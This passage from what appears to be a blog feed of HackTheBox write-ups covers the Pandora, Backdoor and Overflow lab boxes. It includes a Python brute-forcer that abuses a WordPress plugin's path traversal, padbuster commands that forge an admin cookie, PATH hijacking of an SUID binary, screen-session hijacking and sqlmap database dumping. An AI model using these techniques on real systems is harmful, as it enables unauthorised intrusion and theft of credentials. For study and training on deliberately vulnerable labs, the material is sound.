<p><img src="/assets/img/20220209212316.png" alt="" /></p>

<p>And it worked;</p>

<p><img src="/assets/img/20220209212416.png" alt="" /></p>

<p>I couldn’t read the <code class="language-plaintext highlighter-rouge">include/config.php</code> file as it is owned by <strong>matt</strong> and the permissions were locked down.</p>

<p>A search in <code class="language-plaintext highlighter-rouge">searchsploit</code> for exploits targeting this service gave a bunch of results;</p>

<p><img src="/assets/img/20220208064507.png" alt="" /></p>

<p>Testing the credentials of <strong>daniel</strong>, I was able to get a different response that indicates a valid credential, with possibly restricted permissions;</p>

<p><img src="/assets/img/20220208064935.png" alt="" /></p>

<p>I have no idea what this API is, so I went back into the box as <strong>daniel</strong>, and start going through the source code of the web app. Inside the <code class="language-plaintext highlighter-rouge">include/</code> folder, I found a file named <code class="language-plaintext highlighter-rouge">api.php</code>, which likely contains the implementation of the API I have access to.</p>

<p>Sending a request to the URL at <code class="language-plaintext highlighter-rouge">/include/api.php</code> gave me this;</p>

<p><img src="/assets/img/20220208130155.png" alt="" /></p>

<p>So I started poking around at the source code of the API to figure out how it works. It accepts username and password through the GET parameters <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">pass</code> respectively. Supplying the creds of <strong>daniel</strong> gave me a different output;</p>

<p><img src="/assets/img/20220208130355.png" alt="" /></p>

<p>Reviewing the source code even more, I realized it expects to be told the task to perform using the parameter <code class="language-plaintext highlighter-rouge">op</code>;</p>

<p><img src="/assets/img/20220208130613.png" alt="" /></p>

<p>The above gave us three valid values for the <code class="language-plaintext highlighter-rouge">op</code> parameter, which are <code class="language-plaintext highlighter-rouge">get</code>, <code class="language-plaintext highlighter-rouge">set</code>, and <code class="language-plaintext highlighter-rouge">help</code>. Looking further into the source code revealed something nice;</p>

<p><img src="/assets/img/20220208130832.png" alt="" /></p>

<p>If I can control the value assigned to the variable <code class="language-plaintext highlighter-rouge">$ext_name</code>, I can control the file that will be included, which I could exploit to load PHP files for <em>arbitrary code execution</em>. Turns out I can, because <code class="language-plaintext highlighter-rouge">$ext_name</code> is assigned the value of a GET parameter;</p>

<p><img src="/assets/img/20220208131814.png" alt="" /></p>

<p>So I logged back into the box and into <code class="language-plaintext highlighter-rouge">/dev/shm/.0</code> directory, and created a PHP script named <code class="language-plaintext highlighter-rouge">.api.php</code> containing my reverse shell;</p>

<p><img src="/assets/img/20220209213324.png" alt="" /></p>

<p>I then have the web app execute the script using the request;</p>

<p><img src="/assets/img/20220209213432.png" alt="" /></p>

<p>Sending this, I got a shell as the user <strong>matt</strong>;</p>

<p><img src="/assets/img/20220209213723.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>matt</strong> does not have sudo permissions on any file in the box. Searching for SUID binaries gave an interesting result;</p>

<p><img src="/assets/img/20220209214320.png" alt="" /></p>

<p>It’s a binary file, so I shipped it over to my attack host and opened it in <code class="language-plaintext highlighter-rouge">radare2</code>. Dumping strings contained in the binary revealed a possible command that could be vulnerable to <em>path tampering</em>;</p>

<p><img src="/assets/img/20220209214759.png" alt="" /></p>

<p>I checked if it’s indeed used as a command by listing all references to it using the command <code class="language-plaintext highlighter-rouge">axt @ &lt;address&gt;</code>. I got one match in the <code class="language-plaintext highlighter-rouge">main()</code> function;</p>

<p><img src="/assets/img/20220209215056.png" alt="" /></p>

<p>Using my shell on the box as <strong>matt</strong>, I moved to a writeable directory, created a file named <code class="language-plaintext highlighter-rouge">tar</code> containing a reverse shell, made it executable, added it to the <code class="language-plaintext highlighter-rouge">$PATH</code> variable, and called the <code class="language-plaintext highlighter-rouge">pandora_backup</code> script. This gave me root access to the box;</p>

<p><img src="/assets/img/20220209222448.png" alt="" /></p>

<p><img src="/assets/img/20220209222501.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong> and <strong>80</strong>.</li>
  <li>UDP port scan revealed port <strong>161</strong> (SNMP) is open.</li>
  <li>NMAP’s <code class="language-plaintext highlighter-rouge">snmp-process</code> revealed a password for a user named <strong>daniel</strong>, which gave access to the box over SSH.</li>
  <li>Inside as <strong>daniel</strong>
    <ul>
      <li>Found a vhost configured with apache that is accessible only locally.</li>
      <li>Setup a tunnel through SSH to access the site from my box.</li>
      <li>Found a vulnerable API that can be exploited for <em>code execution</em> as the user <strong>matt</strong>.</li>
    </ul>
  </li>
  <li>Inside as <strong>matt</strong>
    <ul>
      <li>Found a custom SUID script.</li>
      <li>Basic analysis with <code class="language-plaintext highlighter-rouge">radare2</code> showed it’s vulnerable to <em>path tampering</em>.</li>
      <li>Exploited it to gain code execution as <em>root</em>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="snmp" /><category term="vhost" /><category term="apache" /><category term="php" /><category term="static analysis" /><category term="lfi" /><category term="suid" /><category term="reverse engineering" /><category term="path tampering" /><category term="radare2" /><summary type="html"><![CDATA[Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.]]></summary></entry><entry><title type="html">Backdoor - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/backdoor.html" rel="alternate" type="text/html" title="Backdoor - HackTheBox" /><published>2022-04-23T00:00:00+01:00</published><updated>2022-04-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/backdoor</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/backdoor.html"><![CDATA[<p><strong>Backdoor</strong> is a very easy linux box on <em>HackTheBox</em>. It starts with a web service running <em>wordpress</em> with a plugin that’s vulnerable to <em>path traversal</em>, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port <strong>1337</strong>, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a <em>screen</em> session running on the box as root.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20220421094330.png" alt="" /></p>

<p><img src="/assets/img/20220421094356.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Sat Nov 20 20:00:32 2021 as: nmap -sC -sV -oN nmap.txt -v backdoor.htb
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &amp;#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 20 20:01:23 2021 -- 1 IP address (1 host up) scanned in 51.47 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>

<p><em>Wappalyzer</em> identified it as a wordpress site;</p>

<p><img src="/assets/img/20220421094748.png" alt="" /></p>

<p>Oddly, the default wordpress plugins directory on the site shows the index of the directory, saving us the need to enumerate plugins;</p>

<p><img src="/assets/img/20220421095240.png" alt="" /></p>

<p>A search on <em>exploitdb</em> using <code class="language-plaintext highlighter-rouge">searchsploit</code> showed this plugin has a vulnerability;</p>

<p><img src="/assets/img/20220421095544.png" alt="" /></p>

<p><img src="/assets/img/20220421095623.png" alt="" /></p>

<p>Using the PoC, I was able to view the file <code class="language-plaintext highlighter-rouge">/etc/hosts</code> on the box;</p>

<p><img src="/assets/img/20220421100027.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using the <em>file traversal</em> bug, a credential was recovered from the wordpress config file <code class="language-plaintext highlighter-rouge">wp-config.php</code>;</p>

<p><img src="/assets/img/20220421100210.png" alt="" /></p>

<p>I was unable to login to the admin dashboard using the credential. Trying the password for the user <strong>user</strong> over SSH also didn’t work;</p>

<p><img src="/assets/img/20220421100541.png" alt="" /></p>

<p>I spent some time working with the <em>file traversal</em> bug, but couldn’t find anything of much interest. A full <code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed port <strong>1337</strong> is open, but could not be identified;</p>

<p><img src="/assets/img/20220421101609.png" alt="" /></p>

<p>Using the <em>file traversal</em> bug, I wrote a simple program to enumerate running processes by burteforcing <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/cmdline</code> in hope of finding the process;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------------------------------
#   A program for bruteforcing running processes on Backdoor (HackTheBox) using
# the path traversal bug in a wordpress plugin.
#                                                               Author: 4g3nt47
#------------------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">queue</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>
<span class="n">threads</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">pids</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
  <span class="n">pids</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">brute</span><span class="p">():</span>
  <span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="n">abort</span> <span class="o">!=</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"http://localhost:8080"</span><span class="p">}</span>
    <span class="n">pid</span> <span class="o">=</span> <span class="n">pids</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">content</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
      <span class="n">invalid</span> <span class="o">=</span> <span class="s">"/proc/%d/cmdline"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
      <span class="n">invalid</span> <span class="o">=</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="n">invalid</span> <span class="o">+</span> <span class="s">"&lt;script&gt;window.close()&lt;/script&gt;"</span>
      <span class="k">if</span> <span class="n">content</span> <span class="ow">and</span> <span class="n">content</span> <span class="o">!=</span> <span class="n">invalid</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"%d : %s"</span> <span class="o">%</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">content</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
      <span class="k">continue</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">):</span>
  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">brute</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

<span class="k">while</span> <span class="n">pids</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] PIDs left: %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">pids</span><span class="p">.</span><span class="n">qsize</span><span class="p">()))</span>
  <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">break</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the program, I found one process that stood out;</p>

<p><img src="/assets/img/20220421102547.png" alt="" /></p>

<p><em>GDB Server</em> is used for remotely debugging programs on a system, which makes it an interesting target for RCE. There is an exploit for this service in <em>metasploit</em>;</p>

<p><img src="/assets/img/20220421103158.png" alt="" /></p>

<p><img src="/assets/img/20220421103612.png" alt="" /></p>

<p>Running the exploit, I got a shell on the box as the user <code class="language-plaintext highlighter-rouge">user</code>;</p>

<p><img src="/assets/img/20220421103755.png" alt="" /></p>

<p>I don’t like working in <em>meterpreter</em> shell, so I switched to a bash reverse shell with tty;</p>

<p><img src="/assets/img/20220421104330.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user is not part of any interesting groups, and I can’t view sudo permissions because I do not have their password.</p>

<p>Going through running processes on the box using <code class="language-plaintext highlighter-rouge">ps</code> and <code class="language-plaintext highlighter-rouge">htop</code>, I found something;</p>

<p><img src="/assets/img/20220421104808.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">screen</code> is a terminal multiplexer, and the above command is running it as the root user. If I can attach to this session, I would be able to easily run commands as root. The interesting portion of the command is <code class="language-plaintext highlighter-rouge">screen -dmS root</code>. Going through the help page of <code class="language-plaintext highlighter-rouge">screen</code>, I learned that it basically creates a screen session in detached mode with the name <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">screen</code> program accepts the <code class="language-plaintext highlighter-rouge">-x</code> flag, which can be used to attach to a given session owned by a given user. Using the command <code class="language-plaintext highlighter-rouge">screen -x root/root</code>, I was able to attach to the screen session created by root;</p>

<p><img src="/assets/img/20220421105356.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified port <strong>22</strong> and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Port <strong>80</strong> is running wordpress with a vulnerable plugin (Path Traversal)</li>
  <li>Full port scan showed port <strong>1337</strong> is open</li>
  <li>Used the <em>path traversal</em> bug to identify the service on port <strong>1337</strong> (gdbserver)
    <ul>
      <li>Used <code class="language-plaintext highlighter-rouge">exploit/multi/gdb/gdb_server_exec</code> in metasploit to gain code execution on the box as the user <strong>user</strong></li>
    </ul>
  </li>
  <li>Inside the box as <strong>user</strong>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">htop</code> showed a screen session running as the user <strong>root</strong></li>
      <li>Attached to the session using <code class="language-plaintext highlighter-rouge">screen -x root/root</code> to gain a shell as <strong>root</strong></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="easy" /><category term="web" /><category term="wordpress" /><category term="path traversal" /><category term="lfi" /><category term="cve" /><category term="metasploit" /><category term="gdbserver" /><category term="screen" /><summary type="html"><![CDATA[Backdoor is a very easy linux box on HackTheBox. It starts with a web service running wordpress with a plugin that’s vulnerable to path traversal, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port 1337, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a screen session running on the box as root.]]></summary></entry><entry><title type="html">Overflow - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/overflow.html" rel="alternate" type="text/html" title="Overflow - HackTheBox" /><published>2022-04-09T00:00:00+01:00</published><updated>2022-04-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/overflow</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/overflow.html"><![CDATA[<p><strong>Overflow</strong> is an amazing <em>hard</em>-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an <em>oracle padding</em> vulnerability to gain access to an admin dashboard that’s vulnerable to <em>SQL injection</em>, use the <em>SQL injection</em> to retrieve and crack a hash for another domain, which is vulnerable to an <em>exiftool</em> RCE.</p>

<p>There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic <em>buffer overflow</em> on a custom binary with a non-excutable (NX) stack.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220216103414.png" alt="" /></p>

<p><img src="/assets/img/20220216103523.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htb
Nmap scan report for overflow.htb (10.10.11.119)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=overflow
| Subject Alternative Name: DNS:overflow
| Issuer: commonName=overflow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-17T10:41:37
| Not valid after:  2031-05-15T10:41:37
| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca
|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e532
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220216103658.png" alt="" /></p>

<p>There is a contact form at the bottom of the page;</p>

<p><img src="/assets/img/20220216104043.png" alt="" /></p>

<p>Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.</p>

<p>There is a login page linked at the top of the homepage;</p>

<p><img src="/assets/img/20220216104151.png" alt="" /></p>

<p>This is submitted in a simple POST request with no tokens;</p>

<p><img src="/assets/img/20220216104422.png" alt="" /></p>

<p>Using the registration page, I was able to create an account and login to the site;</p>

<p><img src="/assets/img/20220216104706.png" alt="" /></p>

<p><img src="/assets/img/20220216104830.png" alt="" /></p>

<p>There is nothing of much interest in the site even after login. The <em>blog</em> page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: <em>Outdated Softwares</em>, <em>Buffer Overflows</em>, <em>Insecure File Uploads</em>, and <em>SQL Truncation Attacks</em>. This feels like a teaser for what’s about to come.</p>

<p>Looking more closely at the homepage, I noticed a possible username <strong>ajmal</strong>;</p>

<p><img src="/assets/img/20220216110013.png" alt="" /></p>

<p>I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user <strong>admin</strong> may exist in the server because I was unable to register an account with it.</p>

<p>Fuzzing the site for hidden subdomains didn’t yield any;</p>

<p><img src="/assets/img/20220216114327.png" alt="" /></p>

<p><br /></p>

<h4 id="smtp">SMTP</h4>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed that SMTP is running on port <strong>25</strong>, and that the <code class="language-plaintext highlighter-rouge">vrfy</code> command is available, which could be used to enumerate valid users. The command showed that the user <code class="language-plaintext highlighter-rouge">root</code> exists on the host;</p>

<p><img src="/assets/img/20220216111316.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code>, the following users were enumerated;</p>
<ul>
  <li>www-data</li>
  <li>root</li>
  <li>postfix</li>
  <li>daemon</li>
  <li>MAILER-DAEMON</li>
  <li>list</li>
  <li>news</li>
  <li>nobody</li>
  <li>mail</li>
  <li>postmaster.</li>
</ul>

<p>These are all default user accounts, so nothing interesting.</p>

<p>Using <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to send an email to the root user without any issues;</p>

<p><img src="/assets/img/20220216112314.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="oracle-padding">Oracle Padding</h3>
<p><br /></p>

<p>I was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the <em>SQL Truncation attack</em>, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.</p>

<p>Fuzzing the login parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> for SQL-related attacks didn’t give me anything. However, the session cookie <code class="language-plaintext highlighter-rouge">auth</code> that is issued after authentication looks interesting because it looks like a URL encoded base64 string;</p>

<p><img src="/assets/img/20220217162110.png" alt="" /></p>

<p>URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.</p>

<p>When adding a single character to the end of the cookie string, which could be anything, I was able to access the <code class="language-plaintext highlighter-rouge">/home/profile/</code> page which is protected by authentication. If I add more than one character at the end of the cookie, I get a <strong>302</strong> redirect to the login page with the parameter <code class="language-plaintext highlighter-rouge">err=1</code>;</p>

<p><img src="/assets/img/20220217163117.png" alt="" /></p>

<p>Going to the URL, I got an interesting message;</p>

<p><img src="/assets/img/20220217163349.png" alt="" /></p>

<p>It was at this point that I actually realised the web application is vulnerable to <em>Execute After Redirect (EAR)</em> vulnerability because the page is actually returned when making a request without the session cookie;</p>

<p><img src="/assets/img/20220217164012.png" alt="" /></p>

<p>Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, or <code class="language-plaintext highlighter-rouge">+</code>.</p>

<p>I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username <strong>admin</strong> (which seems to be already registered) didn’t work.</p>

<p>I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory <strong>config</strong>;</p>

<p><img src="/assets/img/20220218055109.png" alt="" /></p>

<p>Fuzzing that directory, I got a few hits;</p>

<p><img src="/assets/img/20220218055219.png" alt="" /></p>

<p>All are just PHP pages, and didn’t give me anything. Bruteforcing the <code class="language-plaintext highlighter-rouge">/home</code> page found a new path <code class="language-plaintext highlighter-rouge">/home/logs.php</code>;</p>

<p><img src="/assets/img/20220218060331.png" alt="" /></p>

<p>Going to the page, I got an <strong>Unauthorized</strong> message. I get this <em>unauthorized</em> message even after logging in with my test account, so this page is probably only accessible by the <strong>admin</strong>.</p>

<p>I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the <code class="language-plaintext highlighter-rouge">auth</code> cookie. I was introduced to <em>Oracle Padding</em> attacks, which is something I’ve never heard before :(</p>

<p>After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called <code class="language-plaintext highlighter-rouge">padbuster</code> that automate this process.</p>

<p>To use <code class="language-plaintext highlighter-rouge">padbuster</code>, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose <code class="language-plaintext highlighter-rouge">/home/profile/</code>. The encrypted string is the cookie value I got after login, and the block size is <strong>8</strong> since the base64-decoded cookie always gives 24 characters, which is a multiple of <strong>8</strong>.</p>

<p>With this info, I was able to decrypt the cookie I was issued using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 <span class="nt">-cookies</span> <span class="s2">"auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It took quite a while, but it worked;</p>

<p><img src="/assets/img/20220218130956.png" alt="" /></p>

<p>Using the command, I was able to craft a cookie with <code class="language-plaintext highlighter-rouge">user=admin</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 <span class="nt">-cookies</span> <span class="s2">"auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72"</span> <span class="nt">-plaintext</span> <span class="s2">"user=admin"</span> <span class="nt">-verbose</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220219081330.png" alt="" /></p>

<p>Loading the homepage using this cookie, I noticed two new links in the homepage;</p>

<p><img src="/assets/img/20220219081749.png" alt="" /></p>

<p>Clicking on <code class="language-plaintext highlighter-rouge">Logs</code> just gave me a little popup;</p>

<p><img src="/assets/img/20220219081834.png" alt="" /></p>

<p>Clicking the <code class="language-plaintext highlighter-rouge">Admin panel</code>, I was presented with a login form;</p>

<p><img src="/assets/img/20220219082100.png" alt="" /></p>

<p>Trying some common defaults for the login didn’t work. Checking burp to see how the <code class="language-plaintext highlighter-rouge">/home/logs.php</code> works, I noticed that it passes a GET parameter <code class="language-plaintext highlighter-rouge">name</code> with the value set to <code class="language-plaintext highlighter-rouge">admin</code>. Adding a single quote to test for <em>SQL Injection</em> gave a <strong>500 Internal Server Error</strong>. So I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, and it turns out to be vulnerable;</p>

<p><img src="/assets/img/20220219084125.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="sql-injection">SQL Injection</h3>
<p><br /></p>

<p>Available databases;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Tables for <code class="language-plaintext highlighter-rouge">cmsmsdb</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>Database: cmsmsdb
[47 tables]
+-----------------------------+
| cms_additional_users        |
---[snip]---
| cms_user_groups             |
| cms_userplugins             |
| cms_userplugins_seq         |
| cms_userprefs               |
| cms_users                   |
| cms_users_seq               |
| cms_version                 |
+-----------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">cms_users</code> contains two hashes;</p>

<table>
  <thead>
    <tr>
      <th>EMAIL</th>
      <th>USERNAME</th>
      <th>PASSWORD</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>admin@overflow.htb</td>
      <td>admin</td>
